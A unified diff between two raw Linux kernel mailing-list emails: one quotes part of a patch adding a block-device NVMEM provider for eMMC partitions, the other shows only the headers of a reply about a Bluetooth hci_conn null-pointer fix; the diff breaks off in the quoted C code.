@@ -1,476 +1,394 @@
-Received: from mx0b-0031df01.pphosted.com (mx0b-0031df01.pphosted.com [205.220.180.131])
+Received: from fout-b4-smtp.messagingengine.com (fout-b4-smtp.messagingengine.com [202.12.124.147])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 0AA463DA7D0
-	for <linux-bluetooth@vger.kernel.org>; Mon, 15 Jun 2026 09:33:35 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=205.220.180.131
-ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1781516017; cv=pass; b=Xy2S3IjeTlQnWwa50JZRUlhjCtltcH9EwMX3PWL6c4rQhp6z7JsTrktMenhr7IEfvaeWGQFpLsz9pEs9gvc8HjcNzxDr/L8S9GL7bd00Vake946bb8bpVrZGv7P4TBooxXtKrzhv+tXXjnfwkW2vTmXq8nUxcPErp+zV0vPV+EI=
-ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1781516017; c=relaxed/simple;
-	bh=yQb4i7L4fkVtRHJ4+idKS19SbRqmGMMEdBwmSWp+lmo=;
-	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=lD8G1/zAk3+blEqpEWJzZoHe18NnitByEkz+4woCWSTPNdu8HM/XgH6lgsPlzezgcIzlX5K8qN+M60Tze5HkAsMxvIeYee0pp1w+80VN552SLw+Q4/qlzhweWgwVFQLQ1+1NIgJJ4FjIdTqDSGBISd+TQsvWytcgkpJ3vD1jGTc=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=oss.qualcomm.com; spf=pass smtp.mailfrom=oss.qualcomm.com; dkim=pass (2048-bit key) header.d=qualcomm.com header.i=@qualcomm.com header.b=S2dbtiXl; dkim=pass (2048-bit key) header.d=oss.qualcomm.com header.i=@oss.qualcomm.com header.b=KZbDlHZF; arc=pass smtp.client-ip=205.220.180.131
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=oss.qualcomm.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=oss.qualcomm.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 86DE83F0762
+	for <linux-bluetooth@vger.kernel.org>; Mon, 15 Jun 2026 12:38:45 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=202.12.124.147
+ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1781527127; cv=none; b=NqHcOZOSOVMgGB+W6tBtvNaNUHgbm9UFl/vBdQSsIF4kK+tSM/9WAm3StvX19mgNKDsvrgWM6VXYQzJdspzLDqh2a3Trzirs6agaMwzJ1xEdrNk0nzSXvBeqVvAeNUG3f3IR9PsiernDlg5Q1lt0V5kDdUFakulSRB6hff7MQDs=
+ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1781527127; c=relaxed/simple;
+	bh=jhx5r+V55hOk1HgUDVSXeWqwkyoMh4AY/jHli0jpUt4=;
+	h=MIME-Version:Date:From:To:Cc:Message-Id:In-Reply-To:References:
+	 Subject:Content-Type; b=j9Pjh3i3FWYno5LE2acUq1u0ZmuOuqBopRsBF/mzdhXz56uSHdJaY8KOpqLVds89R91kiXfZ/Vc/cFxyM/1TgblF1wknsbzLiJJ2fjdR/XQ9KXxBVr1heTHxjrYA45brHml+hfxeK6EzJQDq1bHQsXZyjAKPyBlXw7JbRMmUa64=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=fourdim.xyz; spf=pass smtp.mailfrom=fourdim.xyz; dkim=pass (2048-bit key) header.d=fourdim.xyz header.i=@fourdim.xyz header.b=Q41uYlgW; dkim=pass (2048-bit key) header.d=messagingengine.com header.i=@messagingengine.com header.b=bvrvNya0; arc=none smtp.client-ip=202.12.124.147
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=fourdim.xyz
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=fourdim.xyz
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=qualcomm.com header.i=@qualcomm.com header.b="S2dbtiXl";
-	dkim=pass (2048-bit key) header.d=oss.qualcomm.com header.i=@oss.qualcomm.com header.b="KZbDlHZF"
-Received: from pps.filterd (m0279871.ppops.net [127.0.0.1])
-	by mx0a-0031df01.pphosted.com (8.18.1.11/8.18.1.11) with ESMTP id 65F99Avp035303
-	for <linux-bluetooth@vger.kernel.org>; Mon, 15 Jun 2026 09:33:35 GMT
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualcomm.com; h=
-	cc:content-transfer-encoding:content-type:date:from:in-reply-to
-	:message-id:mime-version:references:subject:to; s=qcppdkim1; bh=
-	qG8HgDUNc/nKERmMalYGQVa0Hi+SFVzgKt5xGaQIVIs=; b=S2dbtiXldx5Ql60C
-	J7+12nSh5fUda9jkhJjD1zB/MbY8XFMoMFuoTOt78NWoMxcqh72cUpHdrxV7Yktt
-	KFwL3N2eypVQk1A/hiyvis9/9GDToStZGj99eBd4eCs501gdrYCA42VZJiqISlAf
-	kimP9DEFi9+SIdGt/RszZyKLAwlr1Uy03s5P8f65WSHRCsctKGbrKS1yzf953eBW
-	BXJek1dzt3vzZAXUa5HcUvQEI8qgxSo+3ravTy2cmkag0jh1WiiB5HpNenyRpYK1
-	9jtAZyLRbdlYrfSgb+LJyM63II7SYVpS1iF5m5XNGPsAXKQKC0AIfzDDPt7F23CA
-	lVpyeg==
-Received: from mail-qk1-f200.google.com (mail-qk1-f200.google.com [209.85.222.200])
-	by mx0a-0031df01.pphosted.com (PPS) with ESMTPS id 4etegur3e3-1
-	(version=TLSv1.3 cipher=TLS_AES_128_GCM_SHA256 bits=128 verify=NOT)
-	for <linux-bluetooth@vger.kernel.org>; Mon, 15 Jun 2026 09:33:34 +0000 (GMT)
-Received: by mail-qk1-f200.google.com with SMTP id af79cd13be357-915767b341eso289013585a.3
-        for <linux-bluetooth@vger.kernel.org>; Mon, 15 Jun 2026 02:33:34 -0700 (PDT)
-ARC-Seal: i=1; a=rsa-sha256; t=1781516014; cv=none;
-        d=google.com; s=arc-20240605;
-        b=TqqyrKWEUpiy+a4E18TsHOAOIIzLUpCsitqN7phgIiraoHk5TxUkbslgIRFrNTTbUJ
-         W1lqjQbC74qoguzTRFgAAS0OXDcRINKBQo9NLl3vTq1WDAFeSCnxD35frD9ux2D1wVzo
-         dovUxJVuqP8VnLHHzGTCntPQj3LPj1AToNlAqRcFTIOkWSv+t9RELS5q9NtySn81VusY
-         rKUYkXBN3hWCqZR+Qz2Y2METsSvB9TuMuPschx1Zt9vuor4RU+2ohuQjMUjpsRiccUfV
-         Xn4WZWrt5wJSiDLJPQt6M9Ay+9x5aqdHQ+PWJ2FYwyLzbspuLKweC8xqR+WIdFurwzV8
-         5m8g==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:dkim-signature;
-        bh=qG8HgDUNc/nKERmMalYGQVa0Hi+SFVzgKt5xGaQIVIs=;
-        fh=ZYL2vhrl7b+O7XqSKvXdFQa4bvA1cxAEYlSa0dl/hIg=;
-        b=OF8hzNTSgBozfndDVMB+u6JygwGJ8AhJftwTUTa6O2aubsalJsKWcjiv5X4IVS4Tlj
-         kktwBd4Yze3RSpshcogFf3BfZLnr2bf0+PjOKn9zc0ck3KeGl+lhbwvKer/oPtaDKDxA
-         cWxkmbct3KUJwtgLdX5sjlTb0S1aN5J8bqLawJmySNXt4CIY1gUpE/kdRzchUKhavfC1
-         ge9PzArB9Xod7X2IAKEF9Z6UN5Huns4SlI3Fq0i6vyKU7NE+JIbd9MIg03PjweoHFOLj
-         WXpQtKjduMwLG6pdKd67lnc7s//B3HDx0mA2w7+fFSq7kgDMudaYC1gVqw5oPt2GpYnp
-         N6CQ==;
-        darn=vger.kernel.org
-ARC-Authentication-Results: i=1; mx.google.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=oss.qualcomm.com; s=google; t=1781516014; x=1782120814; darn=vger.kernel.org;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:from:to:cc:subject:date
-         :message-id:reply-to;
-        bh=qG8HgDUNc/nKERmMalYGQVa0Hi+SFVzgKt5xGaQIVIs=;
-        b=KZbDlHZF3WPK8z6uUZg+Qpt4T4MM6I93LOSGpAq2i5ykdy28IBDsWM7GWAI9WiPxs3
-         tg0Do0SBS+G4OMwfUN0CR2EwnyZKHkDR8DeICRIuDiI2jCU8hdR1oseuR37yhuu0RquP
-         aZPx55z2sCmWAFF0iFA1wSLqWw9Mk56z9Ol1b1XwXTgTXi5cOIHB3O7AJM3U+3/WC6ey
-         LPYU9iE2PmFuxXFPOr15+eW841thomXgiUG9eYl25YZr5eDLnPoEPfy8MeDM17hODaGY
-         XG7N10rDjOAqQTRI0UsX9VkJ2B9/1kxxq1BAd6CnKw4hdtq0x/DeJvwNpXan2Og1ECBI
-         hF1Q==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1781516014; x=1782120814;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
-         :to:cc:subject:date:message-id:reply-to;
-        bh=qG8HgDUNc/nKERmMalYGQVa0Hi+SFVzgKt5xGaQIVIs=;
-        b=fIzeuL7ifT/rNFgH4z0Olf3ZODLmRX7+FjO5bgh34o4Ooh3qqlVyNBBof7eUGSJOvn
-         VL3hK/1UAU/cMk052O6NKZOuACKiWd78jKuqZkGpVGNwSKSlhQ5gJO66VPLv17evtCtv
-         YkexyfjD3qo6/pOWU/HgBA2xGx8QvHDIDjPnicxDeCWWi7/OK7zrcD6D2ge/Ck3PKapW
-         FomTPyI5VFZCNiYOUHHmK1uDyTwk+O/bjYQ9M23uC8NS1x7dBTpM0YgxAsxf2svgLmFI
-         KJtbI7sp3o2TKURKEHSFkDs979rg5PwmnoBhuOahjQvctR/1RWqZRrGQA4qTiEGBkV0q
-         6BTQ==
-X-Forwarded-Encrypted: i=1; AFNElJ/oh2V7kMWSY7qEcV6NmES4pb/yq2KhTV8QNPhbcw/7gRdoryfzCpu9MquWjJdDZ6DLu+d/NB0ZQI+4aoBfa2k=@vger.kernel.org
-X-Gm-Message-State: AOJu0Yw4WDjVjO/JsCiO5N400hP9Q5bFotHR4NGJpnKzngNzBDRTrfCz
-	aVHm8UTWKm+C8i80i2/gQZE1RIdqkk8JP+OEqGeRkq6bSztHG424bh9VFIz2GS6wylDniAf5vjs
-	9kFfVvVKkDcRHDvpWIB+bkZWpTMSJtaPKB7ghk4HHMKccxli506eK1p4F+lZJh6v31b8wAzlhx+
-	IsVeYxNZv/wSDkul56dGkjv/+Z10jlLog701lIra7uj8hTKw==
-X-Gm-Gg: Acq92OErjhM6jhMDfrdFjnr9QUcgMRwoTZcvzg+EwfvkNPCvkMXvbDQ97yd7S1CX86e
-	qSLOpmeuLUC7ftySCVm/EW39YfiPdzxU7V7YXM/lWubZp+u5/fTuy0ehD8moHV0vSwiRCR6JQu2
-	88W55Y8atiNXo0D/w+6SMp0y5dS13drpkV4TsBn5dT8TlkCTcyZ4ALoNc7pApVzpxy+pZk/ZIkV
-	5vfG1m5zIe3InA+IeIn+8XFyf7WFvphq67xQDQzQa3GTuQWxiQpm0jBRh2ON+O6NdAbLfXG4FjE
-	lybpxUyNKg7Lpggetumw
-X-Received: by 2002:a05:620a:4552:b0:916:1726:4893 with SMTP id af79cd13be357-9161bbfd132mr2043631385a.16.1781516013831;
-        Mon, 15 Jun 2026 02:33:33 -0700 (PDT)
-X-Received: by 2002:a05:620a:4552:b0:916:1726:4893 with SMTP id
- af79cd13be357-9161bbfd132mr2043628485a.16.1781516013345; Mon, 15 Jun 2026
- 02:33:33 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=fourdim.xyz header.i=@fourdim.xyz header.b="Q41uYlgW";
+	dkim=pass (2048-bit key) header.d=messagingengine.com header.i=@messagingengine.com header.b="bvrvNya0"
+Received: from phl-compute-03.internal (phl-compute-03.internal [10.202.2.43])
+	by mailfout.stl.internal (Postfix) with ESMTP id B896E1D000CD;
+	Mon, 15 Jun 2026 08:38:44 -0400 (EDT)
+Received: from phl-imap-10 ([10.202.2.85])
+  by phl-compute-03.internal (MEProxy); Mon, 15 Jun 2026 08:38:44 -0400
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=fourdim.xyz; h=
+	cc:cc:content-transfer-encoding:content-type:content-type:date
+	:date:from:from:in-reply-to:in-reply-to:message-id:mime-version
+	:references:reply-to:subject:subject:to:to; s=fm3; t=1781527124;
+	 x=1781613524; bh=Q/Qzz9LLEF1Y7l9pA/ZUcAxeUda/4K38gW3HfxjqupE=; b=
+	Q41uYlgWc9nbbZnGnpvQSUGjQ2Cy6Bqrs1N/yRqE7GdNwHHk30qlvxOzs3OvhEPP
+	JFGUALhKR5gSbpUneF/Tge1w79gHQY8rm40T3yZPrBG4ig2sPE9+df1gkJoxnDIK
+	WS9YXX8fADsWUSHK3CyOpxIXvhsZbJT3f9LDxK3Ft/xtxTKLO1l8Te/OlfFdVStW
+	zA5kt58H4HNm1OvTOdFg6GwJ0Ag3dENuRb8xq4bk4lpjPKQ2v1XuC4cdUiPKZ0Ve
+	h3DIcsBMCgy30VkGfwzTTD61V1wM0024yDQVviV40cI5syz2Nuj4R9CG58i9bgj1
+	rK2kfWDnmFD1AIumN8GoEw==
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
+	messagingengine.com; h=cc:cc:content-transfer-encoding
+	:content-type:content-type:date:date:feedback-id:feedback-id
+	:from:from:in-reply-to:in-reply-to:message-id:mime-version
+	:references:reply-to:subject:subject:to:to:x-me-proxy
+	:x-me-sender:x-me-sender:x-sasl-enc; s=fm1; t=1781527124; x=
+	1781613524; bh=Q/Qzz9LLEF1Y7l9pA/ZUcAxeUda/4K38gW3HfxjqupE=; b=b
+	vrvNya0JwmrCnfifd/H9+xTqFqWju8M3WIDu3CB5u51jxHJunFL6w04MYRj6LIuy
+	EfzBwLlbksh3nYPEadNpxmzQrQmAyd/d4uD/sKHQ2Z6T2AgM0s4/dOT8LM5pbxrB
+	Ey05CFxantbEkuB8+yHzK6THbtj6MiKxJm1CE0NGs0mnPWzIMMnWMWo6DJeGABzy
+	CCR6k8ZSmYC9hXVyq5/ToVLdl7L2wkAl8ya8RiTAalW04gmbSH53MZOa/kLbEnSz
+	1tG7gQM5C24ygF/C9FgJLczylSvyJ+0nRlKnqyAyKWCqmfKQq/M0SYG7GcfgPApO
+	AjUeGVfpRcTUrekZUetRw==
+X-ME-Sender: <xms:VPIvarL1I3ufF8ZRm8hEmtVPNnEpu3FzSZlzumOAJ2AZH8AEVe7urQ>
+    <xme:VPIvap9ctHQHU4v4ndtWs-Ln1aelB3-zhyRfFVbnqq1J6pjAyNvbOWR6-UDPsYFgm
+    H-oI95velbjakm4EAeFFoNHQvTX7CtE8pe1OnmJ0AnT5zw_Cx4xfQ>
+X-ME-Proxy-Cause: dmFkZTFbzlEdjTcqktu2oY3msssfOTV7jr/4VmcCEkj5aoysIjvA1iZJCz/9vr+EHdRT5M
+    rEkfNXCp0bdYt40YlNO2DMWmCjKdEDb0PN1m7m7o4qcdgaVEdK1BbSX0VOVahOH14OOJKk
+    aUkgIB65QUB7ZuTIqhhzu47us6cu+0C+DTq0BaXPdvypndwtkrABcCDCA2viRINu/3tcGx
+    sMAUDZRhH43yI4aPdO60/nVPK9+rYXAppp6Uy2sFfa2AZcxRqnWHYs6GYI2vYktIhbKcGZ
+    cygfvvRqdfgtR6ibwd55zaUoeeIxfQIfviKuAZAcUcBRLCGskRlHEAY7tN71FiigisaOhT
+    +YpdOzSRi5Ex1pOeJSGSEqvn9kwn1JmNcXHS511MXEYUjnUPn6agIPUaQ/OMNhUfvuHSvi
+    oFintyYz/8H92OIVSpoijs/Nxw42DyD48JWc2QK01Y1Hf/yBFZCxqcWookJZcke9s3Ry3w
+    zR9oszd+CQemMCRo81vOoRUK3NK+6mCD8n93bnBkCSGe+HHVcbcWbyYBwqGiRkVKDFnbfA
+    8w9Hs6Wa4oT8wjXU2Kjfe17PR6VAX7+8iXrOeS/0FSmQRf80LURKAfQUn6qsDE1GOA3wNI
+    X/ABHBOMfyyIk1nQ7pOvoP4VpR9QMfh7u7oWgIgRy2PUnkJ4xyZQD9djFYCw
+X-ME-Proxy: <xmx:VPIvavnRxYjTrZWTOk9b5dqIIPcK3pBsaKzAtKSyj6-TN18pZPRQ9Q>
+    <xmx:VPIvaqmgNl_S5QbJWYPMuB86EBAc_c7n7GuBsZwcS_oFL6gVtkvz9Q>
+    <xmx:VPIvaou5x7LCDd06DCMdYqI9Y26AmaZZ2z0hmNeGlXsyKiz60zVG1Q>
+    <xmx:VPIvalljcjAcsGM8M0vKBeBMNfk7uOh7RuOsWy5Jj2iUuL5IB5Z3Mw>
+    <xmx:VPIvarvSFhpJ_ItQv9meWBL3oPjRyeAT8KREOgL4unKWqg22L3S7jxIV>
+Feedback-ID: if72e4b10:Fastmail
+Received: by mailuser.phl.internal (Postfix, from userid 501)
+	id 50930216008A; Mon, 15 Jun 2026 08:38:44 -0400 (EDT)
+X-Mailer: MessagingEngine.com Webmail Interface
 Precedence: bulk
 X-Mailing-List: linux-bluetooth@vger.kernel.org
 List-Id: <linux-bluetooth.vger.kernel.org>
 List-Subscribe: <mailto:linux-bluetooth+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-bluetooth+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-References: <20260612-block-as-nvmem-v5-0-95e0b30fff90@oss.qualcomm.com>
- <20260612-block-as-nvmem-v5-5-95e0b30fff90@oss.qualcomm.com>
- <CAMRc=McQkLnz2OS2RREAbcrsp47cL-W3bCduq8LwPBBUcVNyJw@mail.gmail.com> <CAFEp6-0qsqhcwnSjm3=bG21jsCktzn5-L5sk2pNTZcGuVXaiNA@mail.gmail.com>
-In-Reply-To: <CAFEp6-0qsqhcwnSjm3=bG21jsCktzn5-L5sk2pNTZcGuVXaiNA@mail.gmail.com>
-From: Loic Poulain <loic.poulain@oss.qualcomm.com>
-Date: Mon, 15 Jun 2026 11:33:22 +0200
-X-Gm-Features: AVVi8CfBRys-DXFI5wrB8yqdywy7X_kfmKpyDKlwYIcwcR0i_tSHWZVN9l-o_rA
-Message-ID: <CAFEp6-0oxBEdfH-fqhdM18pt4JewLwrMOON9qpQgLFh8KS0hDg@mail.gmail.com>
-Subject: Re: [PATCH v5 5/9] block: implement NVMEM provider
-To: Bartosz Golaszewski <brgl@kernel.org>
-Cc: linux-mmc@vger.kernel.org, devicetree@vger.kernel.org,
-        linux-kernel@vger.kernel.org, linux-arm-msm@vger.kernel.org,
-        linux-block@vger.kernel.org, linux-wireless@vger.kernel.org,
-        ath10k@lists.infradead.org, linux-bluetooth@vger.kernel.org,
-        netdev@vger.kernel.org, daniel@makrotopia.org,
-        Ulf Hansson <ulfh@kernel.org>, Rob Herring <robh@kernel.org>,
-        Krzysztof Kozlowski <krzk+dt@kernel.org>,
-        Conor Dooley <conor+dt@kernel.org>,
-        Bjorn Andersson <andersson@kernel.org>,
-        Konrad Dybcio <konradybcio@kernel.org>, Jens Axboe <axboe@kernel.dk>,
-        Johannes Berg <johannes@sipsolutions.net>,
-        Jeff Johnson <jjohnson@kernel.org>,
-        Marcel Holtmann <marcel@holtmann.org>,
-        Luiz Augusto von Dentz <luiz.dentz@gmail.com>,
-        Balakrishna Godavarthi <quic_bgodavar@quicinc.com>,
-        Rocky Liao <quic_rjliao@quicinc.com>,
-        "David S. Miller" <davem@davemloft.net>,
-        Eric Dumazet <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>,
-        Paolo Abeni <pabeni@redhat.com>, Simon Horman <horms@kernel.org>,
-        Srinivas Kandagatla <srini@kernel.org>, Andrew Lunn <andrew@lunn.ch>,
-        Heiner Kallweit <hkallweit1@gmail.com>,
-        Russell King <linux@armlinux.org.uk>,
-        Saravana Kannan <saravanak@kernel.org>
-Content-Type: text/plain; charset="UTF-8"
+X-ThreadId: AyaPtLk80PWF
+Date: Mon, 15 Jun 2026 08:38:24 -0400
+From: "Siwei Zhang" <oss@fourdim.xyz>
+To: "XIAO WU" <xiaowu.417@qq.com>,
+ "Luiz Augusto von Dentz" <luiz.dentz@gmail.com>
+Cc: linux-bluetooth@vger.kernel.org
+Message-Id: <bed30255-ccf4-4f84-a19d-557bd8bdeeb0@app.fastmail.com>
+In-Reply-To: <tencent_CB641244263894463F94A2B27D5E9BE43D07@qq.com>
+References: <20260611152039.2176565-1-oss@fourdim.xyz>
+ <tencent_CB641244263894463F94A2B27D5E9BE43D07@qq.com>
+Subject: Re: [PATCH v3] Bluetooth: hci_conn: Fix null ptr deref in hci_abort_conn()
+Content-Type: text/plain; charset=utf-8
 Content-Transfer-Encoding: quoted-printable
-X-Proofpoint-Spam-Details-Enc: AW1haW4tMjYwNjE1MDEwMCBTYWx0ZWRfXxZdHmdLbFEMD
- 4xY6NuGpgurmiCETGFep6zRNdHDZrfNxdLBXa0044/BrTMMQU1Dm4/FhJZRdMg5ZUu8s2cX4dEj
- tzYdmZqtGKk8Q0qVAMDmF/A4HwuOyo+8+SckMsBg1FZ1rSaxsztw+pIeSG2ZTgY46GS5Nr5hHp2
- tIXHEsfo+zHDLdkHbaadBVNXZk8IXyuGetgkoGJZVMw5CT6DLyY1D9RrRYRIsVWS9c08tVXO2Mq
- 1EojsrMx8hKhYx9bPJiy+C7ZmEpX5wqng1FQs49GqziAkkS22wrI2OeI2n/wLbZfa7KQ7qk1woH
- ovaqrqFO0zTD1q8Du1ybSsLyrUvqHLCrm3Xu2PC6b0QFqQHgI6FkugYDQE+/qRZdhL25U7/vN2o
- hA5LOKLtV5slWbPPBi8McUVICj6hvZTNlT1Z0rZjHY6/zj1ZxNzzu4FtQPUuVlSn3tyD1mSItwp
- 21xGXraYFW9rDZRlJiQ==
-X-Proofpoint-ORIG-GUID: cWqC-Nt0WH7seDXPSlYOdYtNE9-3y907
-X-Authority-Analysis: v=2.4 cv=HMvz0Itv c=1 sm=1 tr=0 ts=6a2fc6ee cx=c_pps
- a=hnmNkyzTK/kJ09Xio7VxxA==:117 a=IkcTkHD0fZMA:10 a=FelO9ux0wxsA:10
- a=s4-Qcg_JpJYA:10 a=VkNPw1HP01LnGYTKEx00:22 a=u7WPNUs3qKkmUXheDGA7:22
- a=3WHJM1ZQz_JShphwDgj5:22 a=EUspDBNiAAAA:8 a=VwQbUJbxAAAA:8 a=VT4XjZGOAAAA:8
- a=NvFwrZXXSFNSu_oYZZQA:9 a=QEXdDO2ut3YA:10 a=PEH46H7Ffwr30OY-TuGO:22
- a=6CpsfURP9XNmmWg3j1mJ:22
-X-Proofpoint-Spam-Info: AW1haW4tMjYwNjE1MDEwMCBTYWx0ZWRfX92cZk8/c1AHR
- CMl4yl7qfuOonSb5sdbwzlQtVwKvlM3Et46aAjgQrJ4zpwBGual7sB/NNRK4bdGOjXl1F/iZmO9
- 1rcCY/MsVec3gQuuXpHrpSPTxQB+vRs=
-X-Proofpoint-GUID: cWqC-Nt0WH7seDXPSlYOdYtNE9-3y907
-X-Proofpoint-Virus-Version: vendor=baseguard
- engine=ICAP:2.0.293,Aquarius:18.0.1143,Hydra:6.1.125,FMLib:17.12.100.49
- definitions=2026-06-15_02,2026-06-12_03,2025-10-01_01
-X-Proofpoint-Spam-Details: rule=outbound_notspam policy=outbound score=0
- lowpriorityscore=0 clxscore=1015 spamscore=0 malwarescore=0 suspectscore=0
- phishscore=0 bulkscore=0 adultscore=0 priorityscore=1501 impostorscore=0
- classifier=typeunknown authscore=0 authtc= authcc= route=outbound adjust=0
- reason=mlx scancount=1 engine=8.22.0-2606040000 definitions=main-2606150100
 
-On Mon, Jun 15, 2026 at 11:28=E2=80=AFAM Loic Poulain
-<loic.poulain@oss.qualcomm.com> wrote:
->
-> On Mon, Jun 15, 2026 at 10:53=E2=80=AFAM Bartosz Golaszewski <brgl@kernel=
-.org> wrote:
-> >
-> > On Fri, 12 Jun 2026 15:20:57 +0200, Loic Poulain
-> > <loic.poulain@oss.qualcomm.com> said:
-> > > From: Daniel Golle <daniel@makrotopia.org>
-> > >
-> > > On embedded devices using an eMMC it is common that one or more parti=
-tions
-> > > on the eMMC are used to store MAC addresses and Wi-Fi calibration EEP=
-ROM
-> > > data. Allow referencing the partition in device tree for the kernel a=
-nd
-> > > Wi-Fi drivers accessing it via the NVMEM layer.
-> > >
-> > > For now, NVMEM is only registered for the whole disk block device, as=
- the
-> > > OF node is currently only associated to it.
-> > >
-> > > Signed-off-by: Daniel Golle <daniel@makrotopia.org>
-> > > Co-developed-by: Loic Poulain <loic.poulain@oss.qualcomm.com>
-> > > Signed-off-by: Loic Poulain <loic.poulain@oss.qualcomm.com>
-> > > ---
-> > >  block/Kconfig             |   9 ++++
-> > >  block/Makefile            |   1 +
-> > >  block/blk-nvmem.c         | 109 ++++++++++++++++++++++++++++++++++++=
-++++++++++
-> > >  block/blk.h               |   8 ++++
-> > >  block/genhd.c             |   4 ++
-> > >  include/linux/blk_types.h |   3 ++
-> > >  include/linux/blkdev.h    |   1 +
-> > >  7 files changed, 135 insertions(+)
-> > >
-> > > diff --git a/block/Kconfig b/block/Kconfig
-> > > index 15027963472d7b40e27b9097a5993c457b5b3054..0b33747e16dc334736837=
-06f75c92bdf8b648f7c 100644
-> > > --- a/block/Kconfig
-> > > +++ b/block/Kconfig
-> > > @@ -209,6 +209,15 @@ config BLK_INLINE_ENCRYPTION_FALLBACK
-> > >         by falling back to the kernel crypto API when inline
-> > >         encryption hardware is not present.
-> > >
-> > > +config BLK_NVMEM
-> > > +     bool "Block device NVMEM provider"
-> > > +     depends on OF
-> > > +     depends on NVMEM
-> > > +     help
-> > > +       Allow block devices (or partitions) to act as NVMEM providers=
-,
-> > > +       typically used with eMMC to store MAC addresses or Wi-Fi
-> > > +       calibration data on embedded devices.
-> > > +
-> > >  source "block/partitions/Kconfig"
-> > >
-> > >  config BLK_PM
-> > > diff --git a/block/Makefile b/block/Makefile
-> > > index 7dce2e44276c4274c11a0a61121c83d9c43d6e0c..d7ac389e71902bc091a88=
-00ea266190a43b3e63d 100644
-> > > --- a/block/Makefile
-> > > +++ b/block/Makefile
-> > > @@ -36,3 +36,4 @@ obj-$(CONFIG_BLK_INLINE_ENCRYPTION) +=3D blk-crypto=
-.o blk-crypto-profile.o \
-> > >                                          blk-crypto-sysfs.o
-> > >  obj-$(CONFIG_BLK_INLINE_ENCRYPTION_FALLBACK) +=3D blk-crypto-fallbac=
-k.o
-> > >  obj-$(CONFIG_BLOCK_HOLDER_DEPRECATED)        +=3D holder.o
-> > > +obj-$(CONFIG_BLK_NVMEM)                +=3D blk-nvmem.o
-> > > diff --git a/block/blk-nvmem.c b/block/blk-nvmem.c
-> > > new file mode 100644
-> > > index 0000000000000000000000000000000000000000..c005f059d9fe56242ebae=
-f9905673dff902b5686
-> > > --- /dev/null
-> > > +++ b/block/blk-nvmem.c
-> > > @@ -0,0 +1,109 @@
-> > > +// SPDX-License-Identifier: GPL-2.0-or-later
-> > > +/*
-> > > + * block device NVMEM provider
-> > > + *
-> > > + * Copyright (c) 2024 Daniel Golle <daniel@makrotopia.org>
-> > > + * Copyright (c) Qualcomm Technologies, Inc. and/or its subsidiaries=
-.
-> > > + *
-> > > + * Useful on devices using a partition on an eMMC for MAC addresses =
-or
-> > > + * Wi-Fi calibration EEPROM data.
-> > > + */
-> > > +
-> > > +#include <linux/file.h>
-> > > +#include <linux/nvmem-provider.h>
-> > > +#include <linux/nvmem-consumer.h>
-> > > +#include <linux/of.h>
-> > > +#include <linux/pagemap.h>
-> > > +#include <linux/property.h>
-> > > +
-> > > +#include "blk.h"
-> > > +
-> > > +static int blk_nvmem_reg_read(void *priv, unsigned int from, void *v=
-al, size_t bytes)
-> > > +{
-> > > +     blk_mode_t mode =3D BLK_OPEN_READ | BLK_OPEN_RESTRICT_WRITES;
-> > > +     dev_t devt =3D (dev_t)(uintptr_t)priv;
-> > > +     size_t bytes_left =3D bytes;
-> > > +     loff_t pos =3D from;
-> > > +     int ret =3D 0;
-> > > +
-> > > +     struct file *bdev_file __free(fput) =3D bdev_file_open_by_dev(d=
-evt, mode, priv, NULL);
-> > > +     if (IS_ERR(bdev_file))
-> > > +             return PTR_ERR(bdev_file);
-> > > +
-> > > +     while (bytes_left) {
-> > > +             pgoff_t f_index =3D pos >> PAGE_SHIFT;
-> > > +             struct folio *folio;
-> > > +             size_t folio_off;
-> > > +             size_t to_read;
-> > > +
-> > > +             folio =3D read_mapping_folio(bdev_file->f_mapping, f_in=
-dex, NULL);
-> > > +             if (IS_ERR(folio)) {
-> > > +                     ret =3D PTR_ERR(folio);
-> > > +                     break;
-> > > +             }
-> > > +
-> > > +             folio_off =3D offset_in_folio(folio, pos);
-> > > +             to_read =3D min(bytes_left, folio_size(folio) - folio_o=
-ff);
-> > > +             memcpy_from_folio(val, folio, folio_off, to_read);
-> > > +             pos +=3D to_read;
